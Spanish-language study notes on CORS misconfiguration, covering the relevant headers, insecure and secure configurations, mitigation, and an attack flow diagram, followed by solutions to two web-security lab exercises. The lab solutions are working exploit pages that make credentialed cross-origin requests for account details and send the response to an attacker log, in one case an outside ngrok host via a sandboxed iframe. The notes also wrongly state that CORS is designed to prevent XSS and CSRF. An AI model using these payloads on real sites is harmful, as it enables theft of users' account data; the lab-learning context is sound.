-- -
La vulnerabilidad CORS (Cross-Origin Resource Sharing) se relaciona con una política de seguridad web que permite o restringe cómo los recursos en una página web pueden ser solicitados desde otro dominio. CORS está diseñado para evitar ataques de tipo Cross-Site Scripting (XSS) y Cross-Site Request Forgery (CSRF), pero si no se configura adecuadamente, puede introducir vulnerabilidades.

### ¿Qué es CORS?
CORS es un mecanismo que usa cabeceras HTTP adicionales para dar a un servidor la capacidad de indicar cualquier origen (dominio, esquema o puerto) que tiene permiso para acceder a sus recursos. Por defecto, los navegadores web imponen una política de mismo origen (Same-Origin Policy), que restringe cómo los recursos en una página web se pueden solicitar desde otro origen.

### Funcionamiento de CORS
Cuando una aplicación web realiza una solicitud HTTP a un dominio diferente (cross-origin request), el navegador puede enviar una solicitud preliminar (preflight request) con el método HTTP OPTIONS para verificar si el servidor permite la solicitud. El servidor responde con las cabeceras apropiadas:

- `Access-Control-Allow-Origin`: Indica qué orígenes tienen permiso para acceder al recurso. Puede ser un valor específico (e.g., `https://ejemplo.com`) o un asterisco (`*`) para permitir cualquier origen.
- `Access-Control-Allow-Methods`: Especifica los métodos HTTP permitidos (e.g., `GET`, `POST`, `PUT`).
- `Access-Control-Allow-Headers`: Indica los encabezados que se pueden usar en la solicitud.
- `Access-Control-Allow-Credentials`: Si está presente y es `true`, permite que se envíen credenciales (cookies, autenticaciones HTTP).

### Vulnerabilidad de CORS
Una configuración incorrecta de CORS puede permitir que un atacante realice solicitudes maliciosas desde un origen no confiable. Aquí algunos escenarios comunes de vulnerabilidad:

1. **Permitir todos los orígenes** (`Access-Control-Allow-Origin: *`): Permitir cualquier origen puede exponer datos sensibles si el recurso es accesible sin restricciones adecuadas.
2. **Falta de validación adecuada**: No validar correctamente los orígenes permitidos puede permitir que orígenes no autorizados accedan a recursos sensibles.
3. **Allow-Credentials con Allow-Origin**: Usar `Access-Control-Allow-Credentials: true` junto con `Access-Control-Allow-Origin: *` es peligroso porque permite que cualquier sitio envíe credenciales, lo cual compromete la seguridad.

### Ejemplo de configuración insegura
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
Esta configuración es insegura porque permite que cualquier origen envíe solicitudes autenticadas, lo cual puede llevar a ataques de tipo CSRF.

### Ejemplo de configuración segura
Para una configuración más segura, especifica orígenes de confianza y evita el uso de `*` cuando se permiten credenciales:
```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
```
Aquí, solo `https://example.com` tiene permiso para acceder al recurso y solo mediante métodos `GET` y `POST`.

### Mitigación
Para mitigar las vulnerabilidades de CORS:
- **Restringe orígenes permitidos**: Limita los orígenes a aquellos que son absolutamente necesarios.
- **Valida cabeceras**: Asegúrate de que las cabeceras CORS sean configuradas correctamente.
- **Auditoría y pruebas**: Regularmente audita y prueba la configuración de CORS para detectar posibles fallos.

En resumen, CORS es una herramienta poderosa para controlar el acceso a recursos web entre diferentes orígenes, pero debe configurarse cuidadosamente para evitar introducir vulnerabilidades que puedan ser explotadas por atacantes.

### Cabeceras

Claro, aquí tienes la información en un formato más estructurado:

### Cabeceras Relacionadas con CORS y sus Funciones
```http 
1. 1. Access-Control-Allow-Origin
   - Función: Especifica qué orígenes pueden acceder al recurso.
   - Ejemplo: `Access-Control-Allow-Origin: https://ejemplo.com`

2. Access-Control-Allow-Credentials
   - Función: Indica si las credenciales (cookies, cabeceras de autenticación HTTP) pueden incluirse en las solicitudes a este recurso.
   - Ejemplo: `Access-Control-Allow-Credentials: true`

3. Access-Control-Allow-Methods
   - Función: Especifica los métodos HTTP permitidos cuando se accede al recurso.
   - Ejemplo: `Access-Control-Allow-Methods: GET, POST, PUT`

4. Access-Control-Allow-Headers
   - Función: Indica qué cabeceras HTTP pueden ser usadas en la solicitud.
   - Ejemplo: `Access-Control-Allow-Headers: Content-Type, Authorization`

5. Access-Control-Expose-Headers
   - Función: Indica qué cabeceras pueden ser expuestas al navegador.
   - Ejemplo: `Access-Control-Expose-Headers: Content-Length, X-Kuma-Revision`

6. Access-Control-Max-Age
   - Función: Especifica el tiempo en segundos que los resultados de una solicitud preflight pueden ser almacenados en caché.
   - Ejemplo: `Access-Control-Max-Age: 3600`

7. Access-Control-Request-Method
   - Función: Usada en solicitudes preflight, indica el método HTTP que será usado en la solicitud real.
   - Ejemplo: `Access-Control-Request-Method: DELETE`

8. Access-Control-Request-Headers
   - Función: Usada en solicitudes preflight, indica las cabeceras HTTP que serán enviadas con la solicitud real.
   - Ejemplo: `Access-Control-Request-Headers: X-PINGOTHER, Content-Type`

9. Origin
   - Función: Indica el origen de la solicitud. Esta cabecera es enviada automáticamente por el navegador en solicitudes cross-origin.
   - Ejemplo: `Origin: https://malicioso.com`

Estas cabeceras son fundamentales para la implementación de políticas de seguridad CORS en aplicaciones web, permitiendo o restringiendo el acceso a recursos dependiendo del origen de las solicitudes y las credenciales incluidas.
```
### Diagrama de flujo
[Atacante] --> [Envía script a la víctima]
           ↓
[Víctima] --> [Ejecuta script en navegador]
           ↓
[Navegador] --> [Envia solicitud a servidor objetivo]
             --> [Incluye cookies de la víctima]
           ↓
[Servidor objetivo] --> [Responde con datos sensibles]
           ↓
[Navegador] --> [Envía datos al servidor del atacante]
           ↓
[Servidor del atacante] --> [Recibe datos exfiltrados]


# Solucion a labs: 
-- -
## Lab 1:
```html
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
var url = "https://0a1a007704d32a8281f59fa800410046.web-security-academy.net";

xhr.onreadystatechange = function () {
    if (xhr.readyState == XMLHttpRequest.DONE){
        fetch("/log?key=" + xhr.responseText)
    }
}

xhr.open('GET', url + "/accountDetails", true);
xhr.withCredentials = true;
xhr.send(null);
</script>
</body>
</html>

```

## Lab 2:
```html
<!DOCTYPE html>
<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://0a1a007704d32a8281f59fa800410046.web-security-academy.net';

            xhr.onreadystatechange = function () {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch('https://b475-2800-810-505-690-46cf-1896-a812-4ce0.ngrok-free.app/log?key=' + xhr.responseText)
                }
            }

            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>"></iframe>
    </body>
</html>

```